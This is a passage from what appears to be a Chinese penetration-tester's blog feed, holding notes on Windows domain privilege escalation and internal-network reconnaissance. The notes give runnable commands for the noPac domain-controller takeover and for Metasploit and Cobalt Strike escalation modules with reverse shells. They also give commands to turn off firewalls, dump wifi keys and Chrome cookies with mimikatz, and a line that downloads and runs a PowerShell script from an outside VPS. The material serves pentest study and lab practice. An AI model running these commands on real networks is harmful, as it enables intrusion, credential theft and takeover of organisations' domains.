title="漏洞介绍"></a>漏洞介绍</h4><p>去年爆出的域提权漏洞，通过两个漏洞·联合域提权</p><h5 id="1、CVE-2021-42278"><a href="#1、CVE-2021-42278" class="headerlink" title="1、CVE-2021-42278"></a>1、CVE-2021-42278</h5><p>一般来说，机器账号的名字应该以<code>$符号结尾的。例如DC$</code>表示DC这台主机的账户名。但是微软只是进行了规定，<strong>并没有验证程序对用户创建的用户名进行验证</strong>，也就是说，创建DC用户名完全是可以的。（这里指的是机器账号的SAMAccountName属性）</p><h5 id="2、CVE-2021-42287"><a href="#2、CVE-2021-42287" class="headerlink" title="2、CVE-2021-42287"></a>2、CVE-2021-42287</h5><p>结合上面那个漏洞，如果创建了一个用户名为DC的账户，此时使用这个账户去申请一张TGT票据，然后在申请ST之前，将这个账户名修改掉或者删除掉，那么在进行申请ST(SESSION Ticket？）的时候，KDC在进行验证时就查不到这个账户，此时KDC就会去查找DC<code>$这个账户，如果这个账户存在的话，最终返回的就是DC$</code>这个账户申请的ST。<strong>也就相当于获取到了域控账户申请的高权限服务票据</strong>。</p><h4 id="漏洞影响范围"><a href="#漏洞影响范围" class="headerlink" title="漏洞影响范围"></a>漏洞影响范围</h4><pre><code>Windows Server 2012 R2 (Server Core installation) Windows Server 2012 R2 Windows Server 2012 (Server Core installation) Windows Server 2012 Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation) Windows Server 2008 R2 for x64-based Systems Service Pack 1 Windows Server 2008 for x64-based Systems Service Pack 2 (Server Core installation) Windows Server 2008 for x64-based Systems Service Pack 2 Windows Server 2008 for 32-bit Systems Service Pack 2 (Server Core installation) Windows Server 2008 for 32-bit Systems Service Pack 2 Windows Server 2016 (Server Core installation) Windows Server 2016 Windows Server, version 20H2 (Server Core Installation) Windows Server, version 2004 (Server Core installation) Windows Server 2022 (Server Core installation) Windows Server 2022 Windows Server 2019 (Server Core installation) Windows Server 2019</code></pre><h4 id="利用（简单）："><a href="#利用（简单）：" class="headerlink" title="利用（简单）："></a>利用（简单）：</h4><blockquote><p>工具<a href="https://github.com/WazeHell/sam-the-admin">https://github.com/WazeHell/sam-the-admin</a></p></blockquote><p>需要一个域用户  ，有域用户普通权限即可创建</p><p><strong>sam_the_admin.py</strong>获取dc shell(看情况是否通过代理运行)</p><pre><code>可能需要先安装模块python3 sam_the_admin.py 域名（x.x）/用户名：密码 -dc-ip x.x.x.x -shell </code></pre><p><strong>noPac.exe</strong>检查漏洞是否存在</p><pre><code>.\noPac.exe scan -domain x.x.x -user x -pass &#39;x&#39; </code></pre><p>获取shell</p><pre><code>proxychains python3 noPac.py -use-ldap de1ay.com/de1ay:1qaz@WSX -dc-ip 10.10.10.10 -shell</code></pre><hr><h1 id="refer"><a href="#refer" class="headerlink" title="refer"></a>refer</h1><blockquote><p>- </p></blockquote><blockquote><p><strong>声明：</strong></p><ol><li><p>若文章存在错误，望诸君不吝指正^</p></li><li><p>部分笔记由于年代久远，做的笔记找不到最初是引用谁的，若是不允许引用转载，请联系我</p></li></ol></blockquote>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 内网 </category>
          
          <category> 权限提升 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>0x22 - 渗透测试框架提权</title>
      <link href="/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%86%85%E7%BD%91/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/0x22-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E6%8F%90%E6%9D%83.html"/>
      <url>/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%86%85%E7%BD%91/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/0x22-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6%E6%8F%90%E6%9D%83.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="Metasploit自动提权"><a href="#Metasploit自动提权" class="headerlink" title="Metasploit自动提权"></a>Metasploit自动提权</h2><h3 id="1、administrator用户替身至system"><a href="#1、administrator用户替身至system" class="headerlink" title="1、administrator用户替身至system"></a>1、administrator用户替身至system</h3><h4 id="命令getsystem："><a href="#命令getsystem：" class="headerlink" title="命令getsystem："></a>命令getsystem：</h4><p>getsystem是由Metasploit-Framework提供的一个模块，它可以将一个管理员帐户（通常为本地Administrator账户）提升为本地SYSTEM帐户 。</p><p><strong>注意：</strong></p><ul><li>必须要为administrator用户，其他管理员组的用户无法成功，因为有UAC检测</li><li>我们通过java漏洞拿到的权限一般是administor权限或者是system权限</li></ul><h4 id="原理流程："><a href="#原理流程：" class="headerlink" title="原理流程："></a>原理流程：</h4><blockquote><p>看完就懂原理<a href="https://zhuanlan.zhihu.com/p/129764147">https://zhuanlan.zhihu.com/p/129764147</a></p></blockquote><p>**注意：**一般administrator用户可以创建服务，服务一般说以system权限运行的</p><p>1)getsystem创建一个新的Windows服务，设置为SYSTEM运行，当它启动时连接到一个<strong>命名管道</strong>。<br>2)getsystem产生一个进程，它创建一个命名管道并等待来自该服务的连接，连接上system权限的服务。<br>3)Windows服务已启动，导致与命名管道建立连接。<br>4)该进程接收连接并调用ImpersonateNamedPipeClient，从而为SYSTEM用户创建模拟令牌。<br>5)然后用新收集的SYSTEM模拟令牌产生cmd.exe，我们劫持cmd.exe后，就有了一个SYSTEM特权进程。<br><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210071438000.png"></p><h3 id="2、不是administrator的管理员用户提权（绕过UAC）"><a href="#2、不是administrator的管理员用户提权（绕过UAC）" class="headerlink" title="2、不是administrator的管理员用户提权（绕过UAC）"></a>2、不是administrator的管理员用户提权（绕过UAC）</h3><p>(管理员组的其他用户-&gt;administrator-&gt;system)</p><h4 id="bypassUAC"><a href="#bypassUAC" class="headerlink" title="bypassUAC"></a>bypassUAC</h4><p>UAC：用户帐户控制（User Account Control），是windows操作系统中采用的一种控制机制，它以预见的方式阻止不必要的系统范围更改</p><p>getsystem提权方式对于普通用户来说是失败的不可正常执行的，那么这种情况下就需要绕过系统UAC来进行getsystem提权</p><p>通俗来讲，UAC就是当普通用户希望以管理员身份运行程序或者服务的时候，会有一个弹窗提醒是否授予权限。但是往往命令行中无法操作这个弹窗！！无法模拟点击</p><p>所以绕过UAC后即可继续进行提权</p><p><strong>注意：</strong></p><ul><li>通过bypassUAC获取的session可以看到依然是普通权限，可以getsystem进行提权至system权限</li><li>通过bypassUAC提权并不会对系统造成太大影响，如果是通过内核漏洞提权，可能会将系统打崩，变蓝屏</li></ul><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210071438725.png" alt="image-20220727040158848" style /><p>maf搜索相关绕过UAC的模块：</p><pre><code>search bypassUAC</code></pre><h4 id="进程注入"><a href="#进程注入" class="headerlink" title="进程注入"></a>进程注入</h4><p>将进程注入另一进程</p><pre><code>use exploit/windows/local/bypassuacset payload windows/meterpreter/reverse_tcpset LHOST=192.168.40.151set session 1exploit</code></pre><p>在原会话基础之上提权，返回一个新会话具有更高权限（虽然显示的还是原本的用户，但是实际上是有administrator的权利）</p><p>再在新会话里getuid即可提权为system</p><h4 id="内存注入"><a href="#内存注入" class="headerlink" title="内存注入"></a>内存注入</h4><pre><code>use exploit/windows/local/bypassuac_injectionset payload windows/meterpreter/reverse_tcpset LHOST=192.168.1.170set session 1exploit</code></pre><h4 id="Eventvwr注册表项"><a href="#Eventvwr注册表项" class="headerlink" title="Eventvwr注册表项"></a>Eventvwr注册表项</h4><pre><code>use exploit/windows/local/bypassuac_eventvwr</code></pre><h4 id="COM处理程序劫持"><a href="#COM处理程序劫持" class="headerlink" title="COM处理程序劫持"></a>COM处理程序劫持</h4><pre><code>use exploit/windows/local/bypassuac_comhijack</code></pre><h3 id="3、kernel漏洞提权"><a href="#3、kernel漏洞提权" class="headerlink" title="3、kernel漏洞提权"></a>3、kernel漏洞提权</h3><p>这个内核漏洞提权在上节课中讲到过，msf也集成了，只不过相对集成的较少</p><blockquote><p>windows-kernel-exploits(Windows平台提权漏洞集合):<br><a href="https://github.com/SecWiki/windows-kernel-exploits">https://github.com/SecWiki/windows-kernel-exploits</a></p></blockquote><pre><code>use post/multi/recon/local_exploit_suggesterset SESSION 1exploit</code></pre><p>注意：在POST模块中的工具可以直接run即可使用，无需配置参数</p><p>运行后会给出在目标机器中可行的提权方式</p><p>优点：省去手动查找的麻烦<br>缺点：不是所有列出的local exploit都可用<br><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210071438064.png"></p><h4 id="kernel漏洞提权"><a href="#kernel漏洞提权" class="headerlink" title="kernel漏洞提权"></a>kernel漏洞提权</h4><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210071438056.png"><br><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210071438024.png"></p><h3 id="4、利用Windows服务的攻击的模块"><a href="#4、利用Windows服务的攻击的模块" class="headerlink" title="4、利用Windows服务的攻击的模块"></a>4、利用Windows服务的攻击的模块</h3><h4 id="unquoted-service-path-模块"><a href="#unquoted-service-path-模块" class="headerlink" title="unquoted_service_path 模块"></a><strong>unquoted_service_path 模块</strong></h4><p>查找有无错误的服务配置，康康能不能造成提权</p><p>已弃用exploits&#x2F;windows&#x2F;local&#x2F;trusted_service_path</p><pre><code>exploit/windows/local/unquoted_service_pathset session 1Exploit -juse exploit/multi/handlerset autorunscript migrate –fExploit -j</code></pre><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210071438088.png"></p><h4 id="service-permissions模块"><a href="#service-permissions模块" class="headerlink" title="service_permissions模块"></a>service_permissions模块</h4><pre><code>use exploit/windows/local/service_permissionsset sessions 1run</code></pre><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210071438549.png"><br><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210071438613.png"></p><h3 id="5、always-install-elevated模块"><a href="#5、always-install-elevated模块" class="headerlink" title="5、always_install_elevated模块"></a>5、always_install_elevated模块</h3><pre><code>use exploit/windows/local/always_install_elevatedset sessions 1run</code></pre><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210071438958.png"><br><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210071438022.png"></p><h3 id="6、Kernel-privilege-escalation"><a href="#6、Kernel-privilege-escalation" class="headerlink" title="6、Kernel privilege escalation"></a>6、Kernel privilege escalation</h3><p>Windows ClientCopyImage Win32k Exploit<br>适用与win7 win server 2008R2SP1 x64</p><pre><code>use exploit/windows/local/ms15_051_client_copy_imageset lhost xx.xx.xx.xxset session 1exploit</code></pre><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210071438610.png"><br><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210071438238.png"></p><h4 id="ms14-058提权"><a href="#ms14-058提权" class="headerlink" title="ms14_058提权"></a>ms14_058提权</h4><pre><code>use exploit/windows/local/ms14_058_track_popup_menuset lhost xx.xx.xx.xxset session 1exploit</code></pre><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210071438486.png"></p><blockquote><p><a href="https://www.freebuf.com/articles/system/184289.html">https://www.freebuf.com/articles/system/184289.html</a></p></blockquote><h2 id="Cobaltstrike自动提权"><a href="#Cobaltstrike自动提权" class="headerlink" title="Cobaltstrike自动提权"></a>Cobaltstrike自动提权</h2><h3 id="CobaltStrike提权模块-beacon-Elevate"><a href="#CobaltStrike提权模块-beacon-Elevate" class="headerlink" title="CobaltStrike提权模块:beacon - Elevate"></a>CobaltStrike提权模块:beacon - Elevate</h3><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210071438605.png" style /><img src="https://oss-yiye.oss-cn-beijing.aliyuncs.com/images/20220424144251.png" style /><h3 id="自用提权exe"><a href="#自用提权exe" class="headerlink" title="自用提权exe"></a>自用提权exe</h3><p>也就是利用cs上传那些提权的工具，在目标机器执行提权</p><pre><code>shell CVE-2019-0803.exe cmd &quot;start beacon.exe&quot;提权成功会返回一个会话，通过beacon.exe连接</code></pre><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210071438128.png" style /><img src="https://oss-yiye.oss-cn-beijing.aliyuncs.com/images/20220425142313.png" style /><h3 id="Powershell检测提权漏洞"><a href="#Powershell检测提权漏洞" class="headerlink" title="Powershell检测提权漏洞"></a>Powershell检测提权漏洞</h3><p>通过powershell检测存在哪些提权漏洞</p><blockquote><p>下载链接(直接在GitHub搜索powerTools)<br><a href="https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1">https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1</a></p></blockquote><blockquote><p><a href="https://github.com/PowerShellMafia/PowerSploit/">https://github.com/PowerShellMafia/PowerSploit/</a></p></blockquote><p>CS提供了直接使用powershell脚本的方法：</p><pre><code>help powershell-importUse: powershell-import [/path/to/local/script.ps1]在脚本中声明了许多的方法！加载脚本后即可使用我们需要用直接使用即可，具体查看GitHub上的解释：</code></pre><p>下面图片的这条命令就是检查目标机器打了哪些补丁啊什么的，检测可以使用哪些方法提权</p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210071438484.png"></p><h3 id="SweetPotato"><a href="#SweetPotato" class="headerlink" title="SweetPotato"></a>SweetPotato</h3><p>用插件的土豆提权也是一样的</p><p><a href="https://github.com/Tycx2ry/SweetPotato_CS">https://github.com/Tycx2ry/SweetPotato_CS</a></p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210071438616.png"></p><hr><h1 id="refer"><a href="#refer" class="headerlink" title="refer"></a>refer</h1><blockquote><p>- </p></blockquote><blockquote><p><strong>声明：</strong></p><ol><li><p>若文章存在错误，望诸君不吝指正^</p></li><li><p>部分笔记由于年代久远，做的笔记找不到最初是引用谁的，若是不允许引用转载，请联系我</p></li></ol></blockquote>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 内网 </category>
          
          <category> 权限提升 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>0x20 - 内网信息收集</title>
      <link href="/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%86%85%E7%BD%91/0x20-%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86.html"/>
      <url>/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%86%85%E7%BD%91/0x20-%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="一、常规信息类收集，应用、服务、权限等"><a href="#一、常规信息类收集，应用、服务、权限等" class="headerlink" title="一、常规信息类收集，应用、服务、权限等"></a>一、常规信息类收集，应用、服务、权限等</h1><h2 id="用户信息收集"><a href="#用户信息收集" class="headerlink" title="用户信息收集"></a>用户信息收集</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">查看本机用户列表</span><br><span class="line">net user</span><br><span class="line"></span><br><span class="line">获取本地管理员信息</span><br><span class="line">net localgroup administrators</span><br><span class="line"></span><br><span class="line">查看当前在线用户</span><br><span class="line">quser </span><br><span class="line">quser user </span><br><span class="line">query user || qwinsta</span><br><span class="line"></span><br><span class="line">查看当前用户在目标系统中的具体权限</span><br><span class="line">whoami /all</span><br><span class="line"></span><br><span class="line">查看当前权限</span><br><span class="line">whoami &amp;&amp; whoami /priv</span><br><span class="line"></span><br><span class="line">查看当前机器中所有的组名，了解不同组的职能，如，IT,HR,ADMIN,FILE</span><br><span class="line"></span><br><span class="line">net localgroup</span><br></pre></td></tr></table></figure><h2 id="系统信息收集"><a href="#系统信息收集" class="headerlink" title="系统信息收集"></a>系统信息收集</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#查询网络配置信息。进行IP地址段信息收集</span><br><span class="line">ipconfig /all</span><br><span class="line"></span><br><span class="line">#查询操作系统及软件信息</span><br><span class="line">systeminfo | findstr /B /C:&quot;OS Name&quot; /C:&quot;OS Version&quot; # 英文系统</span><br><span class="line">systeminfo | findstr /B /C:&quot;OS 名称&quot; /C:&quot;OS 版本&quot; #中文系统</span><br><span class="line"></span><br><span class="line">#查看当前系统版本</span><br><span class="line">wmic OS get Caption,CSDVersion,OSArchitecture,Version</span><br><span class="line">#查看系统体系结构</span><br><span class="line">echo %PROCESSOR_ARCHITECTURE%</span><br><span class="line"></span><br><span class="line">#查询本机服务信息</span><br><span class="line">wmic service list brief</span><br><span class="line"></span><br><span class="line">#查看安装的软件的版本、路径等</span><br><span class="line">wmic product get name, version</span><br><span class="line">powershell &quot;Get-WmiObject -class Win32_Product |Select-Object -Property name, version&quot;</span><br><span class="line"></span><br><span class="line">#查询进程信息</span><br><span class="line">tasklist</span><br><span class="line">wmic process list brief</span><br><span class="line"></span><br><span class="line">#查看启动程序信息</span><br><span class="line">wmic startup get command,caption </span><br><span class="line"></span><br><span class="line">#查看计划任务</span><br><span class="line">at（win10之前）</span><br><span class="line">schtasks /query </span><br><span class="line">/fo LIST </span><br><span class="line">/v（win10）</span><br><span class="line"></span><br><span class="line">#列出或断开本地计算机与所连接的客户端的对话</span><br><span class="line">net session</span><br><span class="line"></span><br><span class="line">#查看远程连接信息</span><br><span class="line">cmdkey /l</span><br><span class="line"></span><br><span class="line">#查看补丁列表（必须要做的）</span><br><span class="line">systeminfo | findstr KB</span><br><span class="line"></span><br><span class="line">#查看补丁的名称、描述、ID、安装时间等</span><br><span class="line">wmic qfe get Caption,Description,HotFixID,InstalledOn</span><br><span class="line"></span><br><span class="line">#查看杀软（重要！必做的）</span><br><span class="line">WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List</span><br><span class="line"></span><br><span class="line">#查看本地密码策略</span><br><span class="line">net accounts</span><br><span class="line"></span><br><span class="line">#查看hosts文件：</span><br><span class="line">Linux：cat /etc/hosts</span><br><span class="line">Windows：type c:\Windows\system32\drivers\etc\hosts</span><br><span class="line">#host文件的作用：</span><br><span class="line">即域名DNS在本地直接的一一映射，比如说如果我们已经绕过CDN得到了某个域名的真实IP，此时我们就可以在本地主机host文件中，建立域名和IP的对应关系，这样子就不会解析到CDN那里去了，直接相当于访问真实主机ip</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>命令太多可通过windows的批处理脚本，bat文件和vbs文件<br>wmic_info整合收集：<br><a href="https://codeload.github.com/Alex-null/wmic_info_gather/">https://codeload.github.com/Alex-null/wmic_info_gather/</a><br>上传至目标执行即可生成out.html文件在下载到本地即可</p><h2 id="防火墙信息收集"><a href="#防火墙信息收集" class="headerlink" title="防火墙信息收集"></a>防火墙信息收集</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#注意！防火墙现在基本关不了了！</span><br><span class="line">#关闭防火墙(Windows Server 2003 以前的版本)</span><br><span class="line">netsh firewall set opmode disable </span><br><span class="line"></span><br><span class="line">#关闭防火墙(Windows Server 2003 以后的版本)</span><br><span class="line">netsh advfirewall set allprofiles state off</span><br><span class="line"></span><br><span class="line">#查看防火墙配置(netsh命令也可以用作端口转发)</span><br><span class="line">netsh firewall show config</span><br><span class="line"></span><br><span class="line">#查看配置规则</span><br><span class="line">netsh advfirewall firewall show rule name=all</span><br><span class="line"></span><br><span class="line">#wifi密码</span><br><span class="line">netsh wlan show profile</span><br><span class="line">netsh wlan show profile name=&quot;EEFUNG&quot; key=clear</span><br></pre></td></tr></table></figure><h2 id="其他信息收集"><a href="#其他信息收集" class="headerlink" title="其他信息收集"></a>其他信息收集</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#回收站内容获取</span><br><span class="line">FOR /f &quot;skip=1 tokens=1,2 delims= &quot; %c in (&#x27;wmic useraccount get name^,sid&#x27;) do dir /a /b C:\$Recycle.Bin\%d\ ^&gt;%c.txt</span><br><span class="line"></span><br><span class="line">会回显目录信息！</span><br><span class="line">.txt ers\86063&gt;dir /a /b C:\$Recycle.Bin\\ &gt;</span><br><span class="line">S-1-5-18</span><br><span class="line">S-1-5-21-1963647555-2248327119-2118898007-1000</span><br><span class="line">S-1-5-21-1963647555-2248327119-2118898007-1001</span><br><span class="line">S-1-5-21-1963647555-2248327119-2118898007-1004</span><br><span class="line">S-1-5-21-1963647555-2248327119-2118898007-1006</span><br><span class="line">S-1-5-21-1963647555-2248327119-2118898007-1008</span><br><span class="line"></span><br><span class="line">然后去提示的目录下找对应文件就好啦</span><br><span class="line">cd C:\$Recycle.Bin\S-1-5-21-3845785564-1101086751-683477353-1001\</span><br><span class="line">$I 开头的文件保存的是路径信息</span><br><span class="line">$R 开头的文件保存的是文件内容</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#Chrome历史记录和Cookie获取(为了获得更多的数据1！！)</span><br><span class="line">%localappdata%\google\chrome\USERDA~1\default\LOGIND~1</span><br><span class="line">%localappdata%\google\chrome\USERDA~1\default\cookies</span><br><span class="line">%localappdata%\google\chrome\USERDA~1\default\主要是在此文件夹下的文件！</span><br><span class="line">chrome的用户信息，保存在本地文件为sqlite 数据库格式</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mimikatz.exe privilege::debug log &quot;dpapi::chrome /in:%localappdata%\google\chrome\USERDA~1\default\cookies /unprotect&quot; exit</span><br><span class="line"></span><br><span class="line">#查看本地代理情况</span><br><span class="line">REG QUERY &quot;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings&quot; /v ProxyServer</span><br><span class="line"></span><br><span class="line">#通过pac文件自动代理情况（不重要）</span><br><span class="line">REG QUERY &quot;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings&quot; /v AutoConfigURL</span><br><span class="line"></span><br><span class="line">#获取远程端口（很重要！常用，拿下远程机器，拿到密码后，需要开启远程登录登陆到目标机器上，一般为3389）</span><br><span class="line">REG query HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server\WinStations\RDP-Tcp /v PortNumber </span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="二、自动信息收集"><a href="#二、自动信息收集" class="headerlink" title="二、自动信息收集"></a>二、自动信息收集</h1><p>等有时间再去关注这个脚本怎么写的</p><h2 id="批处理文件（机器信息收集包含提权信息）"><a href="#批处理文件（机器信息收集包含提权信息）" class="headerlink" title="批处理文件（机器信息收集包含提权信息）"></a>批处理文件（机器信息收集包含提权信息）</h2><p>Host Information Gathering Script：HIGS.bat<br><a href="https://github.com/myh0st/scripts/blob/master/Windows%E4%B8%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/HIGS.bat">https://github.com/myh0st/scripts/blob/master/Windows%E4%B8%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/HIGS.bat</a> </p><p>privilege-escalation-awesome-scripts：winPEAS.bat<br>WinPEAS 是一个脚本，用于搜索在 Windows 主机上提升权限的可能路径（需要 Net.4）<br><a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/winPEAS/winPEASbat/winPEAS.bat">https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/winPEAS/winPEASbat/winPEAS.bat</a> </p><p> 这是一个为没有powershell的旧版本机器设计的 权限提升（枚举）脚本。该脚本代表了从各种来源收集的各种权限提升检查的集合，所有这些检查都是通过几乎每个版本的 Windows 中存在的本机 Windows 二进制文件完成的。<br><a href="https://github.com/M4ximuss/Powerless/Powerless.bat">https://github.com/M4ximuss/Powerless/Powerless.bat</a></p><h2 id="powershell"><a href="#powershell" class="headerlink" title="powershell"></a>powershell</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">powershell脚本</span><br><span class="line">FTP访问、共享连接、putty连接、驱动、应用程序、hosts 文件、进程、无线网络记录</span><br><span class="line">在自己vps开启服务器：python3 -m http.server，用于ps命令获取脚本文件</span><br><span class="line">powershell iex(new-object net.webclient).downloadstring(&#x27;http://124.223.217.243:8000/Get-Information.ps1&#x27;);Get-Information</span><br><span class="line"></span><br><span class="line">Nishang-Gather-Get-Information.ps1</span><br><span class="line">脚本一般放在自己的VPS上，开启快捷的http服务，供目标机器下载</span><br><span class="line">https://github.com/samratashok/nishang/blob/master/Gather/Get-Information.ps1</span><br></pre></td></tr></table></figure><h2 id="msf自动信息收集"><a href="#msf自动信息收集" class="headerlink" title="msf自动信息收集"></a>msf自动信息收集</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#scraper</span><br><span class="line">Meterpreter &gt; run scraper</span><br><span class="line">生成的信息文件，默认在此目录：/root/.msf4/logs/scripts/scraper</span><br><span class="line"></span><br><span class="line">#winenum</span><br><span class="line">Meterpreter &gt; run winenum</span><br><span class="line">生成的信息文件，默认在此目录：/root/.msf4/logs/scripts/winenum</span><br></pre></td></tr></table></figure><h1 id="三、架构信息类收集-网络、用户、域控等"><a href="#三、架构信息类收集-网络、用户、域控等" class="headerlink" title="三、架构信息类收集-网络、用户、域控等"></a>三、架构信息类收集-网络、用户、域控等</h1><h2 id="网络信息收集"><a href="#网络信息收集" class="headerlink" title="网络信息收集"></a>网络信息收集</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#查看本机所有的tcp,udp端口连接及其对应的pid</span><br><span class="line">netstat -ano</span><br><span class="line"></span><br><span class="line">#查看本机所有的tcp,udp端口连接,pid及其对应的发起程序（system权限）</span><br><span class="line">netstat -anob</span><br><span class="line"></span><br><span class="line">#查看本机共享列表和可访问的域共享列表 （445端口）（需要掌握的！！重要）</span><br><span class="line">net share</span><br><span class="line">wmic share get name,path,status</span><br><span class="line">很有可能通过IPC连接！需要注意</span><br><span class="line"></span><br><span class="line">#查看路由表和arp缓存</span><br><span class="line">route print</span><br><span class="line">arp -a</span><br></pre></td></tr></table></figure><h2 id="域控信息"><a href="#域控信息" class="headerlink" title="域控信息"></a>域控信息</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ipconfig /all 通过查询网络信息判断是否在域内</span><br><span class="line">nslookup + dns后缀   </span><br><span class="line">whoami /all 用户权限,获取SID</span><br><span class="line">net config workstation 登录信息</span><br><span class="line"></span><br><span class="line">net user 本地用户</span><br><span class="line">net localgroup 本地用户组</span><br><span class="line">net user /domain 或 wmic useraccount get /all   获取域用户信息</span><br><span class="line">net group /domain 获取域用户组信息（Enterprise Admins组权限最大）</span><br><span class="line">wmic useraccount get /all 涉及域用户详细信息</span><br><span class="line">net group &quot;Domain Admins&quot; /domain 查询域内Domain Admins组的管理员账户</span><br><span class="line">net group &quot;Enterprise Admins&quot; /domain 查询域系统管理员用户组，即Enterprise Admins组</span><br><span class="line">net group &quot;Domain Controllers&quot; /domain 查询域控制器，即Domain Controllers组</span><br><span class="line">注意！：winddows的一个特性：命令执行时，会根据空格进行划分，绕过一条命令中有空格，或者是一个名字有空格，需要带上双引号，将它包括起来，当作一个整体</span><br><span class="line"></span><br><span class="line">net view /domain 域名     查询域内所有计算机</span><br><span class="line">net group &quot;domain computers&quot; /domain  查询所有域成员列表</span><br><span class="line">net accounts /domain  查看域管理策略</span><br><span class="line">net localgroup administrators /domain 登录本机的域管理员</span><br><span class="line">nslookup -q=ns de1ay.com   查看域内DNS服务器定位域控</span><br></pre></td></tr></table></figure><h2 id="组权限说明"><a href="#组权限说明" class="headerlink" title="组权限说明"></a>组权限说明</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Domain Admins : 域管理员组 </span><br><span class="line">Domain Computers : 域内机器 </span><br><span class="line">Domain Controllers ：域控制器 </span><br><span class="line">Domain Guest ： 域访客，权限较低 </span><br><span class="line">Domain User ： 域用户 </span><br><span class="line">Enterprise Admins ： 企业系统管理员用户</span><br></pre></td></tr></table></figure><h2 id="dsquery信息收集"><a href="#dsquery信息收集" class="headerlink" title="dsquery信息收集"></a>dsquery信息收集</h2><p>dsquery工具一般在域控上才有,不过你可以上传一个dsquery</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dsquery computer   查看当前域内的所有机器</span><br><span class="line">dsquery user    查看当前域中的所有账户名</span><br><span class="line">dsquery group    查看当前域内的所有组名</span><br><span class="line">dsquery site   查看域内所有的web站点</span><br><span class="line">dsquery server   查看当前域中的服务器(一般结果只有域控的主机名)</span><br><span class="line">dsquery user domainroot -name admin* -limit 240   查询前240个以admin开头的用户名</span><br><span class="line"></span><br><span class="line">nltest /domain_trusts   查询域内信任关系</span><br><span class="line">nltest /DCLIST:xs   查看域控制器的机器名</span><br></pre></td></tr></table></figure><h2 id="探测域内存活主机"><a href="#探测域内存活主机" class="headerlink" title="探测域内存活主机"></a>探测域内存活主机</h2><h3 id="Netbios协议探测"><a href="#Netbios协议探测" class="headerlink" title="Netbios协议探测"></a>Netbios协议探测</h3><h4 id="Netbios简介："><a href="#Netbios简介：" class="headerlink" 